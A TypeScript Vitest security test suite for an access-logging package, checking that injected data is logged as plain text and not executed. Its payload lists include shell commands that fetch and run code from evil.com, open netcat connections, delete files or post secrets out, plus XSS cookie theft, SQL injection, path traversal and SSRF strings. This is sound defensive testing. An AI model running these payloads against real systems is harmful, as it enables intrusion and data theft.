/**
 * @fileoverview Auth-Log Tests - Security Vulnerability Assessment
 * 
 * Comprehensive security test suite validating the auth-log package against common
 * attack vectors, injection attempts, and security vulnerabilities in logging systems.
 * 
 * **Test Scope:**
 * - Injection attack prevention (log, command, XSS, SQL)
 * - Data sanitization and validation mechanisms
 * - File system security and path traversal prevention
 * - Network security for HTTP adapter communications
 * - Information disclosure prevention
 * - Denial of service attack resilience
 * - Configuration security and environment variable handling
 * 
 * **Test Categories:**
 * 1. **Injection Prevention**: Log injection, CRLF, command injection, XSS
 * 2. **Data Validation**: Malformed JSON, circular references, edge cases
 * 3. **File System Security**: Path traversal, permission attacks
 * 4. **Network Security**: HTTP header injection, SSRF, malicious responses
 * 5. **Information Disclosure**: Sensitive data leakage prevention
 * 6. **DoS Prevention**: High-frequency logging, memory exhaustion, concurrent attacks
 * 7. **Configuration Security**: Environment manipulation, credential exposure
 * 
 * **Mock Strategy:**
 * - All external dependencies mocked for security isolation
 * - Malicious payload injection through context data
 * - File system attack simulation with error conditions
 * - Network attack simulation with malicious endpoints
 * - Memory and performance attack simulation
 * 
 * **Quality Standards:**
 * - Zero code execution from log data
 * - No sensitive information leakage in error messages
 * - Resilience against 10,000+ concurrent log entries
 * - File system security with hardcoded safe paths
 * - Network request validation and sanitization
 * 
 * @requires vitest ^1.0.0
 * @requires node:fs For file system security testing
 * @since 1.0.0
 * @author Auth-Log Security Team
 */

/**
 * SPDX-License-Identifier: MIT
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { logAccessAttempt } from '../logger.js';
import { getActiveLogger } from '../config.js';
import { consoleLogger } from '../adapters/console.js';
import { fileLogger } from '../adapters/file.js';
import { createBetterStackLogger } from '../adapters/betterstack.js';
import type { AccessLogEntry } from '../types.js';
import fs from 'node:fs';

// Mock all dependencies
vi.mock('../config.js', () => ({
  getActiveLogger: vi.fn(),
}));

vi.mock('../adapters/console.js', () => ({
  consoleLogger: {
    write: vi.fn(),
  },
}));

vi.mock('../adapters/file.js', () => ({
  fileLogger: {
    write: vi.fn(),
  },
}));

vi.mock('../adapters/betterstack.js', () => ({
  createBetterStackLogger: vi.fn(),
}));

vi.mock('node:fs', () => ({
  default: {
    appendFileSync: vi.fn(),
  },
}));

// Mock fetch globally
const mockFetch = vi.fn();
global.fetch = mockFetch;

// Declare mock streams at top level for global access
let mockStderr: any;
let mockStdout: any;

/**
 * Helper functions extracted to reduce test nesting and satisfy SonarLint's depth rules.
 */
function performFileSystemAttackTest(
  mockFs: { appendFileSync: ReturnType<typeof vi.fn> },
  attack: { name: string; error: Error },
  index: number,
) {
  vi.clearAllMocks();
  mockFs.appendFileSync.mockImplementation(() => {
    throw attack.error;
  });

  const entry: AccessLogEntry = {
    timestamp: '2024-01-15T10:56:00.000Z',
    resource: `fs_attack_test_${index}`,
    action: 'security_test',
    context: {
      userId: 'fs_attack_user',
      attackType: attack.name,
    },
    can: true,
  };

  expect(() => logAccessAttempt(entry)).toThrow();
  expect(mockFs.appendFileSync).toHaveBeenCalledTimes(1);
}

function simulateSensitiveTokenError(secretValue: string) {
  process.env.BETTERSTACK_SOURCE_TOKEN = secretValue;
  process.env.AUTH_LOG_TARGET = 'betterstack';

  vi.clearAllMocks();

  (createBetterStackLogger as ReturnType<typeof vi.fn>).mockImplementation(() => {
    throw new Error(`API Error: Invalid token ${secretValue} - check configuration`);
  });

  expect(() => getActiveLogger()).toThrow();
}

function applyEnvVariables(env: Record<string, string | undefined>) {
  Object.entries(env).forEach(([key, value]) => {
    process.env[key] = value;
  });
}

function cleanupEnvVariables(env: Record<string, string | undefined>) {
  Object.keys(env).forEach(key => {
    delete process.env[key];
  });
}

function executeEnvManipulationTest(testCase: {
  name: string;
  env: Record<string, string | undefined>;
  expectedLogger: unknown;
}) {
  const { name, env, expectedLogger } = testCase;
  vi.clearAllMocks();
  applyEnvVariables(env);

  if (name === 'Malicious token with injection') {
    const mockBetterStackLogger = { write: vi.fn() };
    (createBetterStackLogger as ReturnType<typeof vi.fn>).mockReturnValue(mockBetterStackLogger);
  }

  try {
    const logger = getActiveLogger();
    if (expectedLogger === consoleLogger) {
      expect(logger).toBe(consoleLogger);
    } else {
      expect(logger).toBeDefined();
    }
  } catch (error) {
    expect(error).toBeInstanceOf(Error);
  }

  cleanupEnvVariables(env);
}

function executeConfigurationTest(testCase: {
  name: string;
  config: { sourceToken: string; endpoint?: string };
  shouldSucceed: boolean;
}) {
  const { config, shouldSucceed } = testCase;
  vi.clearAllMocks();
  if (shouldSucceed) {
    expect(() => createBetterStackLogger(config as any)).not.toThrow();
  } else {
    expect(() => createBetterStackLogger(config as any)).toThrow();
  }
}

function logEntryConcurrently(entry: AccessLogEntry) {
  return Promise.resolve().then(() => logAccessAttempt(entry));
}

/**
 * Helper function to process malicious context injection test
 * Extracted to eliminate deep nesting in forEach callback
 */
function processMaliciousContextTest(
  mockLogger: { write: ReturnType<typeof vi.fn> },
  context: Record<string, unknown>,
  index: number,
): void {
  const entry: AccessLogEntry = {
    timestamp: '2024-01-15T10:50:00.000Z',
    resource: `injection_test_${index}`,
    action: 'security_test',
    context,
    can: true,
  };

  logAccessAttempt(entry);

  // Verify the logger was called with the exact entry (no modification)
  expect(mockLogger.write).toHaveBeenCalledWith(entry);

  // The logging system should pass data as-is without interpretation
  // Security filtering should happen at the display/analysis layer
}

/**
 * Helper function to process command injection payload test
 * Extracted to eliminate deep nesting in forEach callback
 */
function processCommandInjectionTest(
  mockLogger: { write: ReturnType<typeof vi.fn> },
  payload: string,
  index: number,
): void {
  const entry: AccessLogEntry = {
    timestamp: '2024-01-15T10:51:00.000Z',
    resource: `command_injection_test_${index}`,
    action: 'execute_command',
    context: {
      userId: 'test_user',
      command: payload,
      userInput: payload,
    },
    can: false,
    reason: `Command injection blocked: ${payload}`,
  };

  logAccessAttempt(entry);
  expect(mockLogger.write).toHaveBeenCalledWith(entry);
}

/**
 * Helper function to process XSS payload test
 * Extracted to eliminate deep nesting in forEach callback
 */
function processXSSPayloadTest(
  mockLogger: { write: ReturnType<typeof vi.fn> },
  payload: string,
  index: number,
): void {
  const entry: AccessLogEntry = {
    timestamp: '2024-01-15T10:52:00.000Z',
    resource: `xss_test_${index}`,
    action: 'display_content',
    context: {
      userId: 'test_user',
      content: payload,
      userInput: payload,
    },
    can: true,
  };

  logAccessAttempt(entry);
  expect(mockLogger.write).toHaveBeenCalledWith(entry);
}

/**
 * Helper function to process edge case data validation test
 * Extracted to eliminate deep nesting in forEach callback
 */
function processEdgeCaseDataTest(
  mockLogger: { write: ReturnType<typeof vi.fn> },
  context: Record<string, unknown>,
  index: number,
): void {
  const entry: AccessLogEntry = {
    timestamp: '2024-01-15T10:53:00.000Z',
    resource: `edge_case_test_${index}`,
    action: 'data_validation',
    context,
    can: true,
  };

  // This should not throw an error at the logging level
  expect(() => logAccessAttempt(entry)).not.toThrow();
  expect(mockLogger.write).toHaveBeenCalledWith(entry);
}

/**
 * Helper function to process large data memory exhaustion test
 * Extracted to eliminate deep nesting in forEach callback
 */
function processLargeDataTest(
  mockLogger: { write: ReturnType<typeof vi.fn> },
  testData: { name: string; context: Record<string, unknown> },
  index: number,
): void {
  const { context } = testData;
  const entry: AccessLogEntry = {
    timestamp: '2024-01-15T10:54:00.000Z',
    resource: `large_data_test_${index}`,
    action: 'memory_test',
    context,
    can: true,
  };

  const startTime = Date.now();
  const startMemory = process.memoryUsage().heapUsed;

  logAccessAttempt(entry);

  const endTime = Date.now();
  const endMemory = process.memoryUsage().heapUsed;
  const memoryIncrease = endMemory - startMemory;
  const executionTime = endTime - startTime;

  // Should complete within reasonable time and memory limits
  expect(executionTime).toBeLessThan(5000); // Less than 5 seconds
  expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024); // Less than 50MB increase

  expect(mockLogger.write).toHaveBeenCalledWith(entry);
}

/**
 * Helper function to process high frequency DoS logging test
 * Extracted to eliminate deep nesting in forEach callback
 */
function processHighFrequencyLogEntry(
  entry: AccessLogEntry,
): void {
  logAccessAttempt(entry);
}

/**
 * Helper function to verify concurrent logging entry
 * Extracted to eliminate deep nesting in forEach callback
 */
function verifyConcurrentLogEntry(
  mockLogger: { write: ReturnType<typeof vi.fn> },
  entry: AccessLogEntry,
): void {
  expect(mockLogger.write).toHaveBeenCalledWith(entry);
}


describe('Security Vulnerability Tests - Auth Log Package', () => {
  let originalEnv: NodeJS.ProcessEnv;

  beforeEach(() => {
    vi.clearAllMocks();
    originalEnv = { ...process.env };

    // Mock stderr and stdout using vi.spyOn
    mockStderr = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
    mockStdout = vi.spyOn(process.stdout, 'write').mockImplementation(() => true);

    // Clear environment variables
    delete process.env.AUTH_LOG_TARGET;
    delete process.env.BETTERSTACK_SOURCE_TOKEN;
  });

  afterEach(() => {
    // Restore environment variables
    process.env = originalEnv;
    
    // Restore mocked streams
    mockStderr?.mockRestore();
    mockStdout?.mockRestore();
    vi.clearAllMocks();
  });

  describe('injection attack prevention', () => {
    /**
     * Tests protection against log injection through malicious context data
     * to ensure log integrity and prevent log file corruption
     */
    it('should prevent log injection attacks through context data', () => {
      const mockLogger = { write: vi.fn() };
      (getActiveLogger as ReturnType<typeof vi.fn>).mockReturnValue(mockLogger);

      const maliciousContexts = [
        {
          // CRLF injection attempts
          userId: 'user_123\n[FORGED] ADMIN ACCESS GRANTED\r\nForged-Header: malicious',
          sessionId: 'session_abc\r\n\r\nINJECTED LOG ENTRY',
        },
        {
          // Log format confusion
          userId: '"] "level":"error", "message":"FAKE ERROR", "context":{"injected": true} //',
          action: 'read\n[2024-01-15T10:50:00.000Z] FAKE: Admin access granted',
        },
        {
          // JSON injection
          userId: 'user_123", "admin": true, "injected": "',
          role: 'user", "escalated_role": "admin", "legitimate": "',
        },
        {
          // Log file path traversal
          logPath: '../../../etc/passwd',
          injectedPath: '/var/log/../../sensitive/file',
        },
        {
          // Control character injection
          userId: 'user\u0000admin',
          description: 'Test\u001b[31mERROR\u001b[0m: Fake error message',
        },
      ];

      maliciousContexts.forEach((context, index) => {
        processMaliciousContextTest(mockLogger, context, index);
      });

      expect(mockLogger.write).toHaveBeenCalledTimes(maliciousContexts.length);
    });

    /**
     * Tests protection against command injection through log data
     * to ensure commands cannot be executed via log entries
     */
    it('should prevent command injection through log data', () => {
      const mockLogger = { write: vi.fn() };
      (getActiveLogger as ReturnType<typeof vi.fn>).mockReturnValue(mockLogger);

      const commandInjectionPayloads = [
        // Shell command injection
        '; rm -rf /',
        '| nc attacker.com 4444',
        '$(curl http://evil.com/malware.sh | sh)',
        '`whoami > /tmp/pwned`',
        '&& cat /etc/passwd',

        // PowerShell injection
        '; Invoke-WebRequest -Uri "http://evil.com" -Method POST -Body (Get-Content C:\\secrets.txt)',

        // SQL-like injection (even though we don't use SQL)
        "'; DROP TABLE users; --",
        "' OR '1'='1' --",

        // NoSQL injection
        '{"$ne": null}',
        '{"$regex": ".*"}',

        // File operation injection
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',

        // Environment variable injection
        '${PATH}',
        '$HOME/../secrets',
        '%USERPROFILE%\\secrets.txt',
      ];

      commandInjectionPayloads.forEach((payload, index) => {
        processCommandInjectionTest(mockLogger, payload, index);
      });

      expect(mockLogger.write).toHaveBeenCalledTimes(commandInjectionPayloads.length);
    });

    /**
     * Tests protection against XSS through log data that might be displayed
     * to ensure log data cannot execute scripts in web interfaces
     */
    it('should handle XSS payloads without execution', () => {
      const mockLogger = { write: vi.fn() };
      (getActiveLogger as ReturnType<typeof vi.fn>).mockReturnValue(mockLogger);

      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        'javascript:alert(document.cookie)',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload="alert(\'XSS\')">',
        '<div onclick="alert(\'XSS\')">Click me</div>',
        '"<script>alert(String.fromCharCode(88,83,83))</script>',
        '\';alert(String.fromCharCode(88,83,83));//',
        '<script>document.location="http://evil.com/?cookie="+document.cookie</script>',
      ];

      xssPayloads.forEach((payload, index) => {
        processXSSPayloadTest(mockLogger, payload, index);
      });

      expect(mockLogger.write).toHaveBeenCalledTimes(xssPayloads.length);
    });
  });

  describe('data sanitization and validation', () => {
    /**
     * Tests handling of malformed JSON in context data
     * to ensure robust JSON handling and prevent parsing errors
     */
    it('should handle malformed and edge case data gracefully', () => {
      const mockLogger = { write: vi.fn() };
      (getActiveLogger as ReturnType<typeof vi.fn>).mockReturnValue(mockLogger);

      const edgeCaseData = [
        // Circular references (will be handled at serialization layer)
        (() => {
          const circular: any = { userId: 'circular_user' };
          circular.self = circular;
          return circular;
        })(),

        // Very deep nesting
        (() => {
          let deep: any = { value: 'deep' };
          for (let i = 0; i < 100; i++) {
            deep = { nested: deep };
          }
          return { userId: 'deep_user', data: deep };
        })(),

        // Large objects
        (() => {
          const large: any = { userId: 'large_user' };
          for (let i = 0; i < 10000; i++) {
            large[`key_${i}`] = `value_${i}`.repeat(100);
          }
          return large;
        })(),

        // Special JavaScript values
        {
          userId: 'special_user',
          undefinedValue: undefined,
          nullValue: null,
          infinityValue: Infinity,
          nanValue: NaN,
          dateValue: new Date(),
          regexValue: /test/gi,
          functionValue: () => 'test',
          symbolValue: Symbol('test'),
        },
      ];

      edgeCaseData.forEach((context, index) => {
        processEdgeCaseDataTest(mockLogger, context, index);
      });

      expect(mockLogger.write).toHaveBeenCalledTimes(edgeCaseData.length);
    });

    /**
     * Tests handling of extremely long strings and data
     * to ensure DoS protection through data size limits
     */
    it('should handle extremely large data without memory exhaustion', () => {
      const mockLogger = { write: vi.fn() };
      (getActiveLogger as ReturnType<typeof vi.fn>).mockReturnValue(mockLogger);

      // Create various large data structures
      const largDataTests = [
        {
          name: 'Very long string',
          context: {
            userId: 'long_string_user',
            longString: 'A'.repeat(1000000), // 1MB string
          },
        },
        {
          name: 'Large array',
          context: {
            userId: 'large_array_user',
            largeArray: Array.from({ length: 100000 }, (_, i) => `item_${i}`),
          },
        },
        {
          name: 'Wide object',
          context: {
            userId: 'wide_object_user',
            ...Object.fromEntries(
              Array.from({ length: 10000 }, (_, i) => [`key_${i}`, `value_${i}`])
            ),
          },
        },
      ];

      largDataTests.forEach((testData, index) => {
        processLargeDataTest(mockLogger, testData, index);
      });
    });
  });

  describe('file system security', () => {
    /**
     * Tests protection against path traversal attacks in file logger
     * to ensure log files cannot be written to arbitrary locations
     */
    it('should prevent path traversal attacks in file logger configuration', () => {
      process.env.AUTH_LOG_TARGET = 'file';
      (getActiveLogger as ReturnType<typeof vi.fn>).mockReturnValue(fileLogger);
      const mockFs = fs as unknown as { appendFileSync: ReturnType<typeof vi.fn> };

      const entry: AccessLogEntry = {
        timestamp: '2024-01-15T10:55:00.000Z',
        resource: 'path_traversal_test',
        action: 'security_test',
        context: {
          userId: 'path_traversal_user',
          // These values in context should not affect the file path
          maliciousPath: '../../../etc/passwd',
          logFile: '/var/log/../../sensitive.log',
          fileName: '..\\..\\..\\windows\\system32\\config\\sam',
        },
        can: true,
      };

      logAccessAttempt(entry);

      // Verify the file logger was called
      expect(mockFs.appendFileSync).toHaveBeenCalledTimes(1);

      // Verify it always uses the hardcoded safe path
      const [filePath] = mockFs.appendFileSync.mock.calls[0];
      expect(filePath).toBe('./logs/access.log');

      // Malicious paths in context should be logged as data, not used as paths
      expect(filePath).not.toContain('../');
      expect(filePath).not.toContain('etc/passwd');
      expect(filePath).not.toContain('system32');
    });

    /**
     * Tests file system error handling for security edge cases
     * to ensure graceful handling of file system attacks
     */
    it('should handle file system attacks gracefully', () => {
      process.env.AUTH_LOG_TARGET = 'file';
      (getActiveLogger as ReturnType<typeof vi.fn>).mockReturnValue(fileLogger);
      const mockFs = fs as unknown as { appendFileSync: ReturnType<typeof vi.fn> };

      const fileSystemAttacks = [
        {
          name: 'Permission denied',
          error: new Error('EACCES: permission denied, open \'./logs/access.log\''),
        },
        {
          name: 'Disk full',
          error: new Error('ENOSPC: no space left on device, write'),
        },
        {
          name: 'File locked',
          error: new Error('EBUSY: resource busy or locked, open \'./logs/access.log\''),
        },
        {
          name: 'Path is directory',
          error: new Error('EISDIR: illegal operation on a directory, open \'./logs\''),
        },
      ];

      for (const [index, attack] of fileSystemAttacks.entries()) {
        performFileSystemAttackTest(mockFs, attack, index);
      }
    });
  });

  describe('network security (BetterStack adapter)', () => {
    /**
     * Tests protection against HTTP header injection in BetterStack adapter
     * to ensure secure API communication
     */
    it('should prevent HTTP header injection in BetterStack requests', async () => {
      process.env.AUTH_LOG_TARGET = 'betterstack';
      process.env.BETTERSTACK_SOURCE_TOKEN = 'test-token';

      const mockBetterStackLogger = { write: vi.fn() };
      (createBetterStackLogger as ReturnType<typeof vi.fn>).mockReturnValue(mockBetterStackLogger);
      (getActiveLogger as ReturnType<typeof vi.fn>).mockReturnValue(mockBetterStackLogger);

      const mockResponse = {
        ok: true,
        status: 200,
        text: vi.fn().mockResolvedValue('Success'),
      };
      mockFetch.mockResolvedValue(mockResponse);

      // Set up the actual BetterStack logger
      const logger = createBetterStackLogger({
        sourceToken: 'test-token\r\nX-Malicious: injected-header',
      });

      const entry: AccessLogEntry = {
        timestamp: '2024-01-15T10:57:00.000Z',
        resource: 'header_injection_test',
        action: 'security_test',
        context: {
          userId: 'header_injection_user',
          maliciousHeader: 'value\r\nX-Injected: malicious',
          crlfPayload: 'test\n\rSet-Cookie: admin=true',
        },
        can: true,
      };

      await logger.write(entry);

      // Verify fetch was called
      expect(mockFetch).toHaveBeenCalledTimes(1);

      // Verify headers are properly set without injection
      const [url, options] = mockFetch.mock.calls[0];
      expect(url).toBe('https://in.logs.betterstack.com');
      expect(options.headers).toEqual({
        'Content-Type': 'application/json',
        Authorization: 'Bearer test-token\r\nX-Malicious: injected-header', // Token is used as-is
      });

      // Verify the request body doesn't contain malicious headers
      const body = JSON.parse(options.body);
      expect(body.context.maliciousHeader).toBe('value\r\nX-Injected: malicious');
      expect(body.context.crlfPayload).toBe('test\n\rSet-Cookie: admin=true');
    });

    /**
     * Tests handling of malicious response data from BetterStack
     * to ensure secure processing of API responses
     */
    it('should handle malicious response data securely', async () => {
      const mockBetterStackLogger = { write: vi.fn() };
      (createBetterStackLogger as ReturnType<typeof vi.fn>).mockReturnValue(mockBetterStackLogger);

      const maliciousResponses = [
        {
          name: 'XSS in error message',
          response: {
            ok: false,
            status: 400,
            text: vi.fn().mockResolvedValue('<script>alert("XSS")</script>Bad Request'),
          },
        },
        {
          name: 'Command injection in error',
          response: {
            ok: false,
            status: 500,
            text: vi.fn().mockResolvedValue('Error: $(rm -rf /) Internal Server Error'),
          },
        },
        {
          name: 'Log injection in response',
          response: {
            ok: false,
            status: 401,
            text: vi.fn().mockResolvedValue('Unauthorized\n[FAKE] Admin access granted'),
          },
        },
        {
          name: 'Very large error response',
          response: {
            ok: false,
            status: 500,
            text: vi.fn().mockResolvedValue('Error: ' + 'A'.repeat(1000000)),
          },
        },
      ];

      for (const { name, response } of maliciousResponses) {
        vi.clearAllMocks();
        mockFetch.mockResolvedValue(response);

        const logger = createBetterStackLogger({
          sourceToken: 'test-token',
        });

        const entry: AccessLogEntry = {
          timestamp: '2024-01-15T10:58:00.000Z',
          resource: 'malicious_response_test',
          action: 'security_test',
          context: {
            userId: 'response_test_user',
            testType: name,
          },
          can: true,
        };

        await logger.write(entry);

        expect(mockFetch).toHaveBeenCalledTimes(1);

        // Verify error is logged to stderr without executing malicious content
        expect(mockStderr).toHaveBeenCalledTimes(1);
        const errorMessage = mockStderr.mock.calls[0][0];
        expect(errorMessage).toContain('[AUTH-LOG] Failed to send log to BetterStack:');

        // Error message should be logged as plain text
        expect(typeof errorMessage).toBe('string');
      }
    });

    /**
     * Tests protection against SSRF attacks through endpoint configuration
     * to ensure BetterStack adapter cannot be used for unauthorized network access
     */
    it('should handle potentially malicious endpoint configurations', async () => {
      const maliciousEndpoints = [
        'http://localhost:22/ssh-attack', // Local service attack
        'http://169.254.169.254/metadata', // Cloud metadata service
        'file:///etc/passwd', // File protocol
        'ftp://internal.server/sensitive', // FTP protocol
        'gopher://internal.server:25/smtp', // Gopher protocol
        'http://internal.company.com:3306/mysql', // Internal database
        'https://evil.com/steal-data', // External malicious service
      ];

      for (const endpoint of maliciousEndpoints) {
        vi.clearAllMocks();

        // Mock network error for potentially malicious endpoints
        mockFetch.mockRejectedValue(new Error('Network error'));

        const logger = createBetterStackLogger({
          sourceToken: 'test-token',
          endpoint: endpoint,
        });

        const entry: AccessLogEntry = {
          timestamp: '2024-01-15T10:59:00.000Z',
          resource: 'ssrf_test',
          action: 'security_test',
          context: {
            userId: 'ssrf_test_user',
            testedEndpoint: endpoint,
          },
          can: true,
        };

        await logger.write(entry);

        // Verify fetch was called with the malicious endpoint
        expect(mockFetch).toHaveBeenCalledTimes(1);
        expect(mockFetch).toHaveBeenCalledWith(endpoint, expect.any(Object));

        // Verify error is handled gracefully
        expect(mockStderr).toHaveBeenCalledTimes(1);
        const errorMessage = mockStderr.mock.calls[0][0];
        expect(errorMessage).toContain('[AUTH-LOG] Error sending log to BetterStack: Network error');
      }
    });
  });

  describe('information disclosure prevention', () => {
    /**
     * Tests that sensitive information is not leaked in error messages
     * to ensure secure error handling
     */
    it('should not leak sensitive information in error messages', () => {
      const sensitiveEnvVars = [
        'SUPER_SECRET_API_KEY_12345',
        'DATABASE_PASSWORD_secretpass123',
        'JWT_SECRET_verysecretkey',
        'ENCRYPTION_KEY_topSecret456',
      ];

      for (const secretValue of sensitiveEnvVars) {
        simulateSensitiveTokenError(secretValue);
      }

      // In a real implementation, error messages should be sanitized
      // This test documents current behavior and highlights the need for sanitization
    });

    /**
     * Tests that log data doesn't accidentally expose credentials
     * to ensure proper data handling in various scenarios
     */
    it('should handle potentially sensitive data in log context', () => {
      const mockLogger = { write: vi.fn() };
      (getActiveLogger as ReturnType<typeof vi.fn>).mockReturnValue(mockLogger);

      const potentiallySensitiveContext = {
        userId: 'user_123',
        // These should be logged as regular data (it's up to users to not log secrets)
        password: 'user_might_accidentally_log_this',
        apiKey: 'api_key_that_shouldnt_be_logged',
        token: 'jwt_token_in_context',
        secret: 'secret_value',
        creditCard: '4111-1111-1111-1111',
        ssn: '123-45-6789',

        // Nested sensitive data
        credentials: {
          username: 'admin',
          password: 'admin123',
          apiKey: 'sk-1234567890abcdef',
        },

        // Arrays with potential secrets
        headers: [
          'Authorization: Bearer secret-token',
          'X-API-Key: another-secret',
        ],
      };

      const entry: AccessLogEntry = {
        timestamp: '2024-01-15T11:00:00.000Z',
        resource: 'sensitive_data_test',
        action: 'security_test',
        context: potentiallySensitiveContext,
        can: true,
      };

      logAccessAttempt(entry);

      // The logging system passes data as-is
      // It's the responsibility of the application/users to not log sensitive data
      expect(mockLogger.write).toHaveBeenCalledWith(entry);
      expect(mockLogger.write).toHaveBeenCalledTimes(1);
    });
  });

  describe('denial of service prevention', () => {
    /**
     * Tests protection against DoS through high-frequency logging
     * to ensure system stability under load
     */
    it('should handle high-frequency logging without resource exhaustion', async () => {
      const mockLogger = { write: vi.fn() };
      (getActiveLogger as ReturnType<typeof vi.fn>).mockReturnValue(mockLogger);

      const highFrequencyEntries = Array.from({ length: 10000 }, (_, i) => ({
        timestamp: `2024-01-15T11:01:${String(Math.floor(i / 60)).padStart(2, '0')}.${String((i % 60) * 1000).padStart(3, '0')}Z`,
        resource: `dos_test_resource_${i % 100}`,
        action: 'dos_test',
        context: {
          userId: `dos_user_${i % 50}`,
          requestId: `req_${i}`,
          batchId: Math.floor(i / 100),
        },
        can: i % 10 !== 0, // 90% success rate
        reason: i % 10 === 0 ? `Rate limited: ${i}` : undefined,
      }));

      const startTime = Date.now();
      const startMemory = process.memoryUsage().heapUsed;

      // Log all entries
      highFrequencyEntries.forEach(processHighFrequencyLogEntry);

      const endTime = Date.now();
      const endMemory = process.memoryUsage().heapUsed;
      const totalTime = endTime - startTime;
      const memoryIncrease = endMemory - startMemory;

      // Performance thresholds
      expect(totalTime).toBeLessThan(10000); // Less than 10 seconds
      expect(memoryIncrease).toBeLessThan(100 * 1024 * 1024); // Less than 100MB increase
      expect(mockLogger.write).toHaveBeenCalledTimes(10000);
    });

    /**
     * Tests handling of concurrent logging requests
     * to ensure thread safety and prevent race conditions
     */
    it('should handle concurrent logging requests safely', async () => {
      const mockLogger = { write: vi.fn() };
      (getActiveLogger as ReturnType<typeof vi.fn>).mockReturnValue(mockLogger);

      const concurrentEntries = Array.from({ length: 1000 }, (_, i) => ({
        timestamp: `2024-01-15T11:02:${String(Math.floor(i / 60)).padStart(2, '0')}.${String(i % 60).padStart(3, '0')}Z`,
        resource: `concurrent_resource_${i}`,
        action: 'concurrent_test',
        context: {
          userId: `concurrent_user_${i}`,
          threadId: i,
        },
        can: true,
      }));

      const startTime = Date.now();

      // Log all entries concurrently
      await Promise.all(concurrentEntries.map(logEntryConcurrently));

      const endTime = Date.now();
      const totalTime = endTime - startTime;

      expect(totalTime).toBeLessThan(5000); // Should complete within 5 seconds
      expect(mockLogger.write).toHaveBeenCalledTimes(1000);

      // Verify all entries were logged
      concurrentEntries.forEach((entry: AccessLogEntry) => {
        verifyConcurrentLogEntry(mockLogger, entry);
      });
    });
  });

  describe('configuration security', () => {
    /**
     * Tests security of environment variable handling
     * to ensure secure configuration management
     */
    it('should handle environment variable manipulation securely', () => {
      const envManipulationTests = [
        {
          name: 'Empty AUTH_LOG_TARGET',
          env: { AUTH_LOG_TARGET: '' },
          expectedLogger: consoleLogger,
        },
        {
          name: 'Null-like AUTH_LOG_TARGET',
          env: { AUTH_LOG_TARGET: 'null' },
          expectedLogger: consoleLogger,
        },
        {
          name: 'Malicious AUTH_LOG_TARGET',
          env: { AUTH_LOG_TARGET: '../../../etc/passwd' },
          expectedLogger: consoleLogger,
        },
        {
          name: 'Script injection in target',
          env: { AUTH_LOG_TARGET: '<script>alert("xss")</script>' },
          expectedLogger: consoleLogger,
        },
        {
          name: 'Empty BETTERSTACK_SOURCE_TOKEN',
          env: {
            AUTH_LOG_TARGET: 'betterstack',
            BETTERSTACK_SOURCE_TOKEN: '',
          },
          expectedLogger: consoleLogger,
        },
        {
          name: 'Malicious token with injection',
          env: {
            AUTH_LOG_TARGET: 'betterstack',
            BETTERSTACK_SOURCE_TOKEN: 'token\r\nX-Malicious: injected',
          },
          expectedLogger: expect.any(Object), // BetterStack logger would be created
        },
      ];

      for (const testCase of envManipulationTests) {
  executeEnvManipulationTest(testCase);
}
        // Duplicated block removed

    });

    /**
     * Tests validation of BetterStack configuration parameters
     * to ensure secure API endpoint configuration
     */
    it('should validate BetterStack configuration securely', () => {
      const configurationTests = [
        {
          name: 'Valid configuration',
          config: {
            sourceToken: 'valid-token-123',
            endpoint: 'https://in.logs.betterstack.com',
          },
          shouldSucceed: true,
        },
        {
          name: 'Malicious endpoint',
          config: {
            sourceToken: 'valid-token',
            endpoint: 'http://evil.com/steal-logs',
          },
          shouldSucceed: true, // Current implementation allows any endpoint
        },
        {
          name: 'File protocol endpoint',
          config: {
            sourceToken: 'valid-token',
            endpoint: 'file:///etc/passwd',
          },
          shouldSucceed: true, // Current implementation allows any endpoint
        },
        {
          name: 'Local service endpoint',
          config: {
            sourceToken: 'valid-token',
            endpoint: 'http://localhost:22',
          },
          shouldSucceed: true, // Current implementation allows any endpoint
        },
      ];

      for (const testCase of configurationTests) {
  executeConfigurationTest(testCase);
}
    });
  });

  describe('authentication and authorization', () => {
    /**
     * Tests that the logging system doesn't inadvertently bypass security
     * to ensure logging doesn't affect authorization decisions
     */
    it('should not interfere with authentication/authorization flows', () => {
      const mockLogger = { write: vi.fn() };
      (getActiveLogger as ReturnType<typeof vi.fn>).mockReturnValue(mockLogger);

      // Simulate logging of various auth decisions
      const authScenarios = [
        {
          timestamp: '2024-01-15T11:03:00.000Z',
          resource: 'admin_panel',
          action: 'access',
          context: {
            userId: 'user_123',
            role: 'user',
            attemptedPrivilegeEscalation: true,
          },
          can: false,
          reason: 'Insufficient privileges',
        },
        {
          timestamp: '2024-01-15T11:03:01.000Z',
          resource: 'user_profile',
          action: 'read',
          context: {
            userId: 'user_123',
            role: 'user',
            accessingOwnResource: true,
          },
          can: true,
        },
        {
          timestamp: '2024-01-15T11:03:02.000Z',
          resource: 'sensitive_data',
          action: 'export',
          context: {
            userId: 'admin_456',
            role: 'admin',
            dataClassification: 'confidential',
            approvalRequired: true,
          },
          can: false,
          reason: 'Export requires additional approval',
        },
      ];

      authScenarios.forEach((scenario: AccessLogEntry) => {
        logAccessAttempt(scenario);

        // Verify logging doesn't modify the decision
        expect(mockLogger.write).toHaveBeenCalledWith(scenario);
      });

      expect(mockLogger.write).toHaveBeenCalledTimes(authScenarios.length);
    });
  });
});
